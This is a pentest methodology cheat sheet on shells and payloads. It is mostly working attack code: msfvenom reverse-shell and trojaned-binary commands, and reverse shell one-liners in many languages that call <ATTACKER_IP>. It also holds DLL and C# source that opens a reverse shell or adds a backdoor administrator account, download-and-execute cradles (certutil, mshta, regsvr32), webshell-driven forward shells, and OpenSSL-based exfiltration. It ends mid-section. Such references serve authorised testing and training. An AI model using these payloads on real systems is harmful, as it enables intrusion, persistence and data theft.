# Shells and Payloads Methodology

Comprehensive reference for shell types, payload generation, listener catching, and TTY upgrades. Every tool-based technique is paired with a Living-Off-The-Land (LOTL) equivalent using built-in OS binaries wherever practical.

Cross-references:
- [windows-methodology.md](windows-methodology.md) — Windows-specific execution and AMSI bypass
- [linux-methodology.md](linux-methodology.md) — Linux foothold and privesc
- [av-evasion.md](av-evasion.md) — payload obfuscation, AV/EDR-aware payload variants, donut/sgn/sRDI loaders
- [file-transfers.md](file-transfers.md) — delivering payloads to target

## Table of Contents

- [Phase 0: Shell Types Overview](#phase-0-shell-types-overview)
- [Phase 1: msfvenom Complete Reference](#phase-1-msfvenom-complete-reference)
- [Phase 2: Reverse Shell Payloads (with LOTL Alternatives)](#phase-2-reverse-shell-payloads-with-lotl-alternatives)
- [Phase 3: TTY Upgrade](#phase-3-tty-upgrade)
- [Phase 4: Catching Shells with pwncat-cs](#phase-4-catching-shells-with-pwncat-cs)
- [Phase 5: Web Shells](#phase-5-web-shells)
- [Phase 6: Bind Shells](#phase-6-bind-shells)
- [Phase 7: Detection Evasion Basics](#phase-7-detection-evasion-basics)
- [Phase 8: Payload Delivery Vectors](#phase-8-payload-delivery-vectors)
- [Quick Reference Cheatsheet](#quick-reference-cheatsheet)

---

## Phase 0: Shell Types Overview

### Bind vs Reverse

| Type | Direction | Use Case | Firewall Considerations |
|------|-----------|----------|-------------------------|
| **Bind** | Attacker → Target (target listens) | Target has open inbound port, no outbound allowed | Target must accept inbound on chosen port |
| **Reverse** | Target → Attacker (attacker listens) | Target is behind NAT, outbound allowed | Most common; bypass egress on 80/443/53 |

### Staged vs Stageless

| Type | Suffix | Size | Behavior |
|------|--------|------|----------|
| **Staged** | `_tcp`, `_http`, `_https` | Small (~300 bytes stub) | Stub downloads payload (stage 2) from handler |
| **Stageless** | `_tcp_uuid`, `_reverse_tcp` (no `/`) | Larger (~200KB+) | Full payload self-contained |

In Metasploit naming: `windows/meterpreter/reverse_tcp` is **staged**, `windows/meterpreter_reverse_tcp` is **stageless** (note the underscore vs slash).

### Encrypted Channels

- `reverse_https` / `reverse_winhttps` — TLS-wrapped, blends with HTTPS traffic, uses WinINet on Windows for proxy awareness
- `reverse_tcp_rc4` — RC4-encrypted TCP
- `reverse_tcp_uuid` — UUID-tagged for multi-session disambiguation

### Interactive vs Non-Interactive

- **Non-interactive**: cannot run `sudo`, `ssh`, `vi`, `su` (no PTY). Tab-completion broken. Ctrl+C kills shell.
- **Interactive (PTY)**: full terminal control, job control, screen-redraw apps work.

See [Phase 3: TTY Upgrade](#phase-3-tty-upgrade) for promoting non-interactive to interactive.

[^ top](#shells-and-payloads-methodology)

---

## Phase 1: msfvenom Complete Reference

### Format Matrix

| Target | Format Flag | Notes |
|--------|-------------|-------|
| Windows EXE | `-f exe` | Standalone executable |
| Windows EXE-Service | `-f exe-service` | Survives `sc start`; service-aware |
| Windows DLL | `-f dll` | Use with rundll32, AppDomainManager, sideloading |
| ASP.NET | `-f aspx` | Drop in IIS webroot |
| Java EE | `-f war` | Tomcat/JBoss `/manager/deploy` |
| Java | `-f jar` | Jenkins, generic JVM |
| JSP | `-f jsp` | Tomcat / Java app servers |
| PHP | `-f raw` (with `php/meterpreter/reverse_tcp`) | Wrap in `<?php ?>` |
| Linux ELF | `-f elf` | Standalone executable |
| Linux SO | `-f elf-so` | LD_PRELOAD, shared lib hijack |
| macOS | `-f macho` | Mach-O binary |
| Raw shellcode | `-f raw` | Pipe into loader, donut, sgn |
| C array | `-f c` | Embed in custom loader |
| Python | `-f python` | Embed in script |
| PowerShell | `-f ps1` | Standalone .ps1 |
| HTA | `-f hta-psh` | mshta delivery |
| MSI | `-f msi` | msiexec install |
| VBS | `-f vbs` | wscript / cscript |
| VBA | `-f vba` | Office macro |
| Bash | `-f bash` | Embed in shell script |

### Payload Selection per OS/Arch

```bash
# Windows x64 staged meterpreter (most common)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe -o shell.exe

# Windows x64 stageless (firewall/IDS friendly, single download)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe -o shell.exe

# Windows x64 HTTPS (blends with web traffic)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 -f exe -o shell.exe

# Windows x86 (legacy / WoW64)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe -o shell32.exe

# Linux x64
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f elf -o shell.elf

# Linux x86
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f elf -o shell32.elf

# Java (cross-platform)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f raw -o shell.jsp
msfvenom -p java/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f jar -o shell.jar

# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f raw -o shell.php
# Then prepend <?php  manually or use:
echo '<?php ' | cat - shell.php > shell.php.tmp && mv shell.php.tmp shell.php

# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f raw -o shell.py

# Generic cmd shell (no meterpreter)
msfvenom -p cmd/unix/reverse_bash LHOST=<ATTACKER_IP> LPORT=4444 -f raw
msfvenom -p cmd/windows/reverse_powershell LHOST=<ATTACKER_IP> LPORT=4444 -f raw
```

### Encoders

```bash
# x86 shikata_ga_nai polymorphic, 10 iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o enc.exe

# x64 dynamic XOR
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o enc.exe

# List all encoders
msfvenom --list encoders

# Chained: encode raw then re-encode (second msfvenom needs -p - to read stdin)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -e x86/shikata_ga_nai -i 5 -f raw | \
  msfvenom -p - -a x86 --platform windows -e x86/countdown -i 3 -f exe -o chained.exe
```

> **Note:** Modern AV signatures all common encoder stubs. Encoders are useful for bad-char filtering in exploits, not for AV bypass. See [av-evasion.md](av-evasion.md).

### Bad Characters

```bash
# Exclude null, line feed, carriage return (typical for buffer overflow)
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -b '\x00\x0a\x0d' -f c

# Common bad-char sets:
# Web/URL contexts: -b '\x00\x0a\x0d\x20\x25\x26\x2b\x3d'
# String functions:  -b '\x00\x0a\x0d\x20'
# Stack BOF:         -b '\x00'
```

### NOP Sled

```bash
# Prepend 16-byte NOP sled (raw shellcode for exploit dev)
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 --nopsled 16 -f c
```

### Template / Binary Injection

```bash
# Inject payload into legitimate signed binary, keep original functionality
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 \
  -x /usr/share/windows-resources/binaries/putty.exe -k \
  -f exe -o putty_backdoored.exe

# -x : template binary
# -k : keep template's original functionality (spawns payload in new thread)
```

### Payload Encryption (msfvenom 6+)

```bash
# AES-256 encrypted payload (CBC mode — IV required; --encrypt-iv generates auto if omitted in some builds, supply explicitly to be safe)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 \
  --encrypt aes256 --encrypt-key <ENCRYPT_KEY> --encrypt-iv <ENCRYPT_IV> \
  -f exe -o encrypted.exe

# Available: --encrypt {xor,rc4,base64,aes256}
```

### Useful Generation Flags

| Flag | Purpose |
|------|---------|
| `-p` | Payload (use `--list payloads` to enumerate) |
| `-f` | Output format |
| `-o` | Output file |
| `-a` | Architecture (`x86`, `x64`) |
| `--platform` | Override platform (`windows`, `linux`) |
| `-e` | Encoder |
| `-i` | Encoder iterations |
| `-b` | Bad characters |
| `-x` | Template binary |
| `-k` | Keep template functional |
| `--smallest` | Generate smallest possible payload |
| `-v` | Variable name (for `-f c` / `-f python`) |
| `--encrypt` | Encrypt final payload |

### Listener Catching

```bash
# Metasploit multi/handler — most flexible
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/x64/meterpreter/reverse_https; \
  set LHOST 0.0.0.0; set LPORT 443; \
  set ExitOnSession false; \
  exploit -j -z"

# Plain netcat (cmd shells only, no meterpreter)
nc -lvnp 4444

# Readline-wrapped netcat (history + arrow keys)
rlwrap nc -lvnp 4444

# Ncat with TLS
ncat --ssl -lvnp 443

# Socat with PTY
socat -d -d TCP-LISTEN:4444,reuseaddr,fork FILE:`tty`,raw,echo=0

# pwncat-cs (modern replacement for nc — see Phase 4)
pwncat-cs -lp 4444
```

### Custom Windows DLL with Named Exports (mingw Cross-Compile)

When a PoC or DLL hijack requires a specific exported function name (not just DllMain), build a custom DLL with `__declspec(dllexport)` targeting that symbol. Useful for DLL sideloading where the legitimate DLL exports `ServiceMain`, `DllGetClassObject`, `InitHelperDll`, etc.

```bash
# Attacker Linux — create DLL source with custom named export
cat << 'EOF' > payload.c
#include <windows.h>
#include <stdlib.h>

// Exported function matching what the vulnerable app calls via GetProcAddress
__declspec(dllexport) void <EXPORT_NAME>(void) {
    system("cmd.exe /c powershell -nop -w hidden -c \"IEX((New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/p.ps1'))\"");
}

// DllMain — executes on DLL load regardless of which export is called
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('<ATTACKER_IP>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sbb=([text.encoding]::ASCII).GetBytes($sb);$s.Write($sbb,0,$sbb.Length);$s.Flush()};$c.Close()\"");
    }
    return TRUE;
}
EOF
```

```bash
# Cross-compile DLL with mingw (x64)
x86_64-w64-mingw32-gcc -shared -o <OUTPUT_DLL>.dll payload.c -lws2_32

# Cross-compile DLL (x86 / WoW64 targets)
i686-w64-mingw32-gcc -shared -o <OUTPUT_DLL>.dll payload.c -lws2_32

# Verify exports
x86_64-w64-mingw32-objdump -p <OUTPUT_DLL>.dll | grep -A 50 "Export Table"
# Or with wine + dumpbin equivalent:
winedump -j export <OUTPUT_DLL>.dll
```

```bash
# Multiple named exports (some apps call multiple functions on load)
cat << 'EOF' > multi_export.c
#include <windows.h>

void run_payload(void) {
    WinExec("cmd.exe /c net user backdoor P@ss123! /add && net localgroup Administrators backdoor /add", 0);
}

__declspec(dllexport) void <EXPORT_NAME1>(void) { run_payload(); }
__declspec(dllexport) void <EXPORT_NAME2>(void) { run_payload(); }
__declspec(dllexport) int <EXPORT_NAME3>(int a, int b) { run_payload(); return 0; }

BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID l) { return TRUE; }
EOF

x86_64-w64-mingw32-gcc -shared -o hijack.dll multi_export.c
```

```bash
# DEF file approach (explicit ordinal control — needed when app imports by ordinal)
cat << 'EOF' > exports.def
LIBRARY "hijack"
EXPORTS
    <EXPORT_NAME1> @1
    <EXPORT_NAME2> @2
    DllRegisterServer @3 PRIVATE
EOF

x86_64-w64-mingw32-gcc -shared -o hijack.dll payload.c exports.def -lws2_32
```

#### Living-off-the-land / LOTL variant

On a Windows target with Visual Studio Build Tools or .NET SDK installed:

```cmd
REM On-target compilation with cl.exe (Visual Studio Developer Command Prompt)
cl.exe /LD /Fe:<OUTPUT_DLL>.dll payload.c ws2_32.lib
```

```powershell
# On-target via Add-Type (C# DLL with exports via DllExport NuGet pattern)
# Limited: C# DLLs don't natively support unmanaged exports without DllExport/UnmanagedExports
# Fallback: compile C code if mingw is on target
& "C:\msys64\mingw64\bin\gcc.exe" -shared -o C:\Temp\hijack.dll C:\Temp\payload.c
```

### Cross-Compile C# Windows EXE from Linux (Mono mcs)

Build Windows-targeted C# executables from a Linux attack box without .NET SDK or Visual Studio. Mono's `mcs` compiler produces valid .NET assemblies that run on any Windows host with .NET Framework installed.

```bash
# Basic reverse shell EXE — compile on Linux, runs on Windows
cat << 'EOF' > revshell.cs
using System;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;

class Program {
    static void Main() {
        using (TcpClient c = new TcpClient("<ATTACKER_IP>", 4444))
        using (Stream s = c.GetStream()) {
            byte[] buf = new byte[65536];
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.UseShellExecute = false;
            p.Start();
            using (StreamWriter sw = p.StandardInput)
            using (StreamReader sr = p.StandardOutput)
            using (StreamReader se = p.StandardError) {
                while (true) {
                    int bytes = s.Read(buf, 0, buf.Length);
                    if (bytes == 0) break;
                    string cmd = System.Text.Encoding.ASCII.GetString(buf, 0, bytes);
                    sw.WriteLine(cmd);
                    sw.Flush();
                    System.Threading.Thread.Sleep(500);
                    string output = sr.ReadToEnd() + se.ReadToEnd();
                    byte[] outBytes = System.Text.Encoding.ASCII.GetBytes(output);
                    s.Write(outBytes, 0, outBytes.Length);
                }
            }
        }
    }
}
EOF

# Compile with mono mcs — produces Windows .exe
mcs -target:winexe -out:revshell.exe revshell.cs -r:System.dll

# Verify it's a valid .NET PE
monodis --assembly revshell.exe
file revshell.exe   # should show "PE32 executable (GUI) Intel 80386 Mono/.Net assembly"
```

```bash
# Compile with specific SDK version (target older .NET Framework)
mcs -sdk:2 -target:exe -out:payload.exe source.cs              # .NET 2.0
mcs -sdk:4 -target:exe -out:payload.exe source.cs              # .NET 4.0
mcs -sdk:4.5 -target:exe -out:payload.exe source.cs            # .NET 4.5

# Reference additional assemblies
mcs -target:winexe -out:payload.exe source.cs \
  -r:System.dll -r:System.Net.dll -r:System.IO.dll -r:System.Management.dll

# Compile DLL (class library) for reflective load
mcs -target:library -out:payload.dll source.cs -r:System.dll
```

```bash
# Simple command executor (useful for quick PoC compilation)
cat << 'EOF' > runcmd.cs
using System;
using System.Diagnostics;
class R {
    static void Main(string[] args) {
        if (args.Length < 1) return;
        Process.Start(new ProcessStartInfo("cmd.exe", "/c " + String.Join(" ", args))
        { UseShellExecute = false, RedirectStandardOutput = true })
        .StandardOutput.ReadToEnd();
    }
}
EOF
mcs -target:exe -out:runcmd.exe runcmd.cs -r:System.dll
```

#### Living-off-the-land / LOTL variant

If already on a Windows target with .NET Framework (nearly all Windows hosts), use the built-in `csc.exe` compiler:

```cmd
REM Find csc.exe on target (always present with .NET Framework)
dir /s /b C:\Windows\Microsoft.NET\Framework64\*csc.exe
REM Typically: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe

REM Compile on-target
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:exe /out:C:\Temp\payload.exe C:\Temp\source.cs
```

[^ top](#shells-and-payloads-methodology)

---

## Phase 2: Reverse Shell Payloads (with LOTL Alternatives)

Reference: <https://www.revshells.com> for one-stop generator.

### Bash (Linux LOTL — no tools needed)

```bash
# /dev/tcp pseudo-device (built into bash)
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'

# Alternative form
exec 5<>/dev/tcp/<ATTACKER_IP>/4444; cat <&5 | while read line; do $line 2>&5 >&5; done

# UDP variant
bash -c 'bash -i >& /dev/udp/<ATTACKER_IP>/4444 0>&1'
```

### sh / busybox

```bash
# Embedded systems / minimal containers
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f

# busybox nc (no -e support — use mkfifo pattern instead)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER_IP> 4444 >/tmp/f
```

### Python

```bash
# python3
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<ATTACKER_IP>",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

# python2 (legacy)
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Perl

```bash
perl -e 'use Socket;$i="<ATTACKER_IP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby

```bash
ruby -rsocket -e 'spawn("sh",[:in,:out,:err]=>TCPSocket.new("<ATTACKER_IP>",4444))'
```

### Node.js

```bash
# Native net + child_process (always works in Node containers)
node -e "var net=require('net'),cp=require('child_process'),sh=cp.spawn('sh',[]);var c=new net.Socket();c.connect(4444,'<ATTACKER_IP>',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c)});"

# mkfifo + nc (LOTL — when nc is available in the container)
node -e "require('child_process').exec('mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f')"
# If /tmp/f exists from prior attempt: rm -f /tmp/f first

# require() one-liner (alternative — uses bash /dev/tcp)
node -e "require('child_process').exec('bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1\"')"

# IMPORTANT: exec() vs execSync()
# exec()     = non-blocking → shell persists → USE THIS FOR REVERSE SHELLS
# execSync() = blocking → shell dies on timeout → use only for command output exfiltration
```

> **Container-aware shell selection:**
> Before sending a reverse shell, check what's available on target:
> `which bash sh nc curl wget node python3 2>/dev/null`
> - **Alpine containers**: no `bash` → use `sh` or `node` native shell
> - **Node.js containers**: `node` is always available → use native net module shell
> - **Distroless**: extremely limited → may need static binary upload

### PHP

```bash
php -r '$sock=fsockopen("<ATTACKER_IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### PowerShell (Windows LOTL)

```powershell
# Classic IEX one-liner (download cradle)
# .ps1 must contain the function CALL at the bottom (e.g. `Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port <PORT>`)
# OR append the call inline:
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port <PORT>"

# Native TCPClient reverse shell (no download required)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Base64-encoded (avoids quoting issues)
$cmd = "<powershell payload>"
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -nop -w hidden -enc $enc
```

### Windows LOTL Downloaders

```powershell
# certutil (signed Microsoft binary)
certutil -urlcache -split -f http://<ATTACKER_IP>/payload.exe C:\Windows\Temp\p.exe & C:\Windows\Temp\p.exe

# bitsadmin
bitsadmin /transfer myDownload /priority normal http://<ATTACKER_IP>/p.exe C:\Windows\Temp\p.exe

# PowerShell DownloadFile
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>/p.exe','C:\Windows\Temp\p.exe')"

# PowerShell Invoke-WebRequest
powershell -c "iwr http://<ATTACKER_IP>/p.exe -OutFile C:\Windows\Temp\p.exe"

# curl (Windows 10 1803+)
curl http://<ATTACKER_IP>/p.exe -o C:\Windows\Temp\p.exe
```

### Forward Shell (Egress-Blocked Environments)

When the target blocks all outbound connections (no reverse shell possible) and inbound ports are filtered (no bind shell), a forward shell polls commands through an existing webshell using named pipes. The attacker drives the interaction from their box; the target never initiates a connection.

```bash
# Attacker side — forward shell client (Python3 script)
# Requires an existing webshell that accepts commands (e.g., shell.php?c=)
# Create this as fwdsh.py on attacker box:
cat << 'FWDEOF' > fwdsh.py
#!/usr/bin/env python3
import requests, threading, time, sys, urllib.parse
URL = sys.argv[1]       # http://<TARGET>/shell.php?c=
STDIN  = "/dev/shm/.fwd_in"
STDOUT = "/dev/shm/.fwd_out"

# Setup named pipes on target via webshell
setup = f"rm -f {STDIN} {STDOUT}; mkfifo {STDIN}; mkfifo {STDOUT}; cat {STDIN} | /bin/sh -i 2>&1 > {STDOUT} &"
requests.get(URL + urllib.parse.quote(setup))
time.sleep(1)

def read_output():
    while True:
        r = requests.get(URL + urllib.parse.quote(f"cat {STDOUT}"), timeout=5)
        if r.text.strip():
            print(r.text, end="", flush=True)
        time.sleep(0.3)

t = threading.Thread(target=read_output, daemon=True)
t.start()

while True:
    cmd = input()
    requests.get(URL + urllib.parse.quote(f"echo '{cmd}' > {STDIN}"))
FWDEOF
chmod +x fwdsh.py
```

```bash
# Usage — point at your webshell's command parameter
python3 fwdsh.py "http://<TARGET>/shell.php?c="
```

```bash
# Manual forward shell via curl (no script needed, slower but works anywhere)
# Step 1: setup pipes on target through the webshell
curl -s "http://<TARGET>/shell.php?c=$(python3 -c 'import urllib.parse;print(urllib.parse.quote("rm -f /dev/shm/.i /dev/shm/.o; mkfifo /dev/shm/.i; mkfifo /dev/shm/.o; cat /dev/shm/.i | /bin/sh -i 2>&1 > /dev/shm/.o &"))')"

# Step 2: send commands (repeat for each command)
curl -s "http://<TARGET>/shell.php?c=$(python3 -c 'import urllib.parse;print(urllib.parse.quote("echo id > /dev/shm/.i"))')"

# Step 3: read output
curl -s "http://<TARGET>/shell.php?c=$(python3 -c 'import urllib.parse;print(urllib.parse.quote("cat /dev/shm/.o"))')"
```

#### Living-off-the-land / LOTL variant

The forward shell concept is inherently LOTL on the target side (mkfifo + sh are POSIX builtins). The attacker side only needs curl or any HTTP client:

```bash
# Pure bash attacker-side loop (no python3 required on attacker)
WEBSHELL="http://<TARGET>/shell.php?c="
FIFO_IN="/dev/shm/.i"
FIFO_OUT="/dev/shm/.o"

# Setup
curl -s "${WEBSHELL}$(printf '%s' "rm -f $FIFO_IN $FIFO_OUT;mkfifo $FIFO_IN;mkfifo $FIFO_OUT;cat $FIFO_IN|/bin/sh -i 2>&1>$FIFO_OUT &" | jq -sRr @uri)" > /dev/null

# Interactive loop
while IFS= read -rp "fwd> " cmd; do
  curl -s "${WEBSHELL}$(printf '%s' "echo '$cmd' > $FIFO_IN" | jq -sRr @uri)" > /dev/null
  sleep 0.5
  curl -s "${WEBSHELL}$(printf '%s' "cat $FIFO_OUT" | jq -sRr @uri)"
done
```

### Squiblydoo / Living-Off-The-Land Execution

```cmd
:: regsvr32 + scrobj.dll (squiblydoo) — runs remote SCT
regsvr32 /s /n /u /i:http://<ATTACKER_IP>/file.sct scrobj.dll

:: mshta — HTML Application execution
mshta http://<ATTACKER_IP>/payload.hta
mshta vbscript:CreateObject("Wscript.Shell").Run("powershell -nop -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/p.ps1'))")(window.close)

:: rundll32 with JS
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -c IEX(IWR http://<ATTACKER_IP>/p.ps1 -UseBasicParsing)")

:: cmstp (INF-based execution)
cmstp.exe /s payload.inf
```

### IPv6 Reverse Shell (AF_INET6)

When the target only has IPv6 reachability (link-local, dual-stack-but-v4-firewalled, v6-only segment) the v4 payloads above will not work. `bash /dev/tcp` has **no IPv6 support** — use Python `AF_INET6`, `ncat`, or `socat`.

```bash
# Attacker — IPv6 listener (ncat handles v6 natively)
ncat -lvn <ATTACKER_IPV6> <ATTACKER_PORT>

# Listen on all v6 + v4 (dual-stack box)
ncat -lvn -6 <ATTACKER_PORT>

# socat alternative — interactive PTY listener over v6
socat -d -d TCP6-LISTEN:<ATTACKER_PORT>,reuseaddr,fork file:`tty`,raw,echo=0

# Open local firewall for inbound v6 (Linux ufw)
sudo ufw allow from <TARGET_IP> to any port <ATTACKER_PORT>
# nftables alternative
sudo nft add rule inet filter input ip6 saddr <TARGET_IP> tcp dport <ATTACKER_PORT> accept
```

```python
# Target — Python3 IPv6 reverse shell. Note AF_INET6 + 4-tuple connect (host, port, flowinfo, scopeid).
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<ATTACKER_PORT>,0,0));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python2 variant (legacy targets)
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<ATTACKER_PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```bash
# bash /dev/tcp does NOT support IPv6 — use python / ncat / socat instead

# ncat outbound (target side) — works over v6
ncat -e /bin/sh <ATTACKER_IP> <ATTACKER_PORT>

# mkfifo + ncat (no -e support)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | ncat <ATTACKER_IP> <ATTACKER_PORT> > /tmp/f

# socat outbound (target) — wrap v6 literal in [] for socat URL syntax
socat TCP6:[<ATTACKER_IP>]:<ATTACKER_PORT> EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

> **Tip:** Link-local-only target needs the scope-id in the v6 connect tuple: `("fe80::1",<ATTACKER_PORT>,0,<IFINDEX>)`. Get `<IFINDEX>` on the target with `ip -6 link` (the number left of the iface name) or `python3 -c 'import socket;print(socket.if_nametoindex("eth0"))'`.

> **URL-encoding gotcha:** delivering this via web command-injection — colons in v6 addresses break shells/HTTP parsers. Encode before pasting into a vulnerable parameter: `:` → `%3a`, `;` → `%3b`, space → `+`, `"` → `%22`. Burp Repeater Ctrl+U URL-encodes selection.

### OpenSSL.exe — Windows LOTL (egress scan, dual-pipe TLS shell, file transfer)

OpenSSL is NOT a default Windows binary — only a LOTL where installed (Apache/IIS, FileZilla, Git for Windows, dev VMs, OpenVPN, common third-party apps). When present, it provides a TLS-wrapped reverse shell that bypasses plaintext IDS and an egress-port scanner that works without PowerShell.

#### Locate openssl.exe on the victim

```cmd
REM Walk the filesystem (slow but thorough)
dir /s /b C:\openssl.exe 2>nul

REM Check %PATH% and common install paths
where openssl
dir "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" 2>nul
dir "C:\Program Files (x86)\OpenSSL-Win32\bin\openssl.exe" 2>nul
dir "C:\Program Files\Git\usr\bin\openssl.exe" 2>nul
dir "C:\Program Files\FileZilla Server\openssl.exe" 2>nul
dir "C:\xampp\apache\bin\openssl.exe" 2>nul
```

#### Attacker — generate self-signed cert and start two TLS listeners

```bash
# Self-signed cert for the s_server side
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=lab"

# Two listeners — one per direction (stdin/stdout split for the dual-pipe shell)
openssl s_server -quiet -key key.pem -cert cert.pem -port <ATTACKER_PORT>     # receives victim stdout
openssl s_server -quiet -key key.pem -cert cert.pem -port <ATTACKER_PORT2>    # sends operator stdin
```

#### Egress port scan from a constrained Windows shell

When PowerShell is locked down (CLM) or blocked, openssl s_client probes outbound TCP. Watch for SYNs landing on the attacker side with tshark to identify which port the egress firewall allows.

```bash
# Attacker — watch for connection attempts
sudo tshark -i tun0 host <TARGET_IP> and portrange 1-1000
```

```cmd
REM Victim — sweep outbound ports until one connects (cmd.exe loop)
FOR /l %i in (1,1,1000) DO C:\Progra~1\OpenSSL-Win64\bin\openssl.exe s_client -connect <ATTACKER_IP>:%i
```

#### Dual-pipe TLS reverse shell (telnet-trick over TLS)

Pipes cmd.exe stdout through one TLS session and reads operator stdin from a second — works because openssl s_client is bidirectional but cmd.exe needs separate stdin/stdout streams to behave interactively.

```cmd
START "" cmd /c "C:\Progra~1\OpenSSL-Win64\bin\openssl.exe s_client -quiet -connect <ATTACKER_IP>:<ATTACKER_PORT> | cmd.exe | C:\Progra~1\OpenSSL-Win64\bin\openssl.exe s_client -quiet -connect <ATTACKER_IP>:<ATTACKER_PORT2>"
```

#### File transfer over TLS pipe

```bash
# Attacker — host a file for download to victim
openssl s_server -quiet -accept <ATTACKER_PORT> -cert cert.pem -key key.pem < payload.bin

# Attacker — receive an upload (exfil) from victim
openssl s_server -quiet -accept <ATTACKER_PORT> -cert cert.pem -key key.pem > loot.bin
```

```cmd
REM Victim — download
C:\Progra~1\OpenSSL-Win64\bin\openssl.exe s_client -connect <ATTACKER_IP>:<ATTACKER_PORT> -quiet > C:\Users\Public\payload.bin

REM Victim — upload (exfil)
C:\Progra~1\OpenSSL-Win64\bin\openssl.exe s_client -connect <ATTACKER_IP>:<ATTACKER_PORT> -quiet < C:\loot\target.bin

REM Integrity check post-transfer
